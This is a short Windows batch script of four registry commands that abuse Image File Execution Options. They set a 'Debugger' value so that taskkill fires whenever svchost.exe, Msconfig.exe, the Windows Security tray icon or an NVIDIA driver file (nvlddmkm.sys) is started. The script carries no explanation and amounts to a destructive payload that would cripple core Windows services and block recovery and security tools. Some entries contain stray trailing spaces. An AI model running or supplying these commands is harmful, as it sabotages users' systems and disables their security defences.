reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\nvlddmkm.sys" /v Debugger /t REG_SZ /d "taskkill /f /im nvlddmkm.sys" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im svchost.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Msconfig.exe " /v Debugger /t REG_SZ /d "taskkill /f /im Msconfig.exe " /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecurityHealthSystray.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SecurityHealthSystray.exe" /f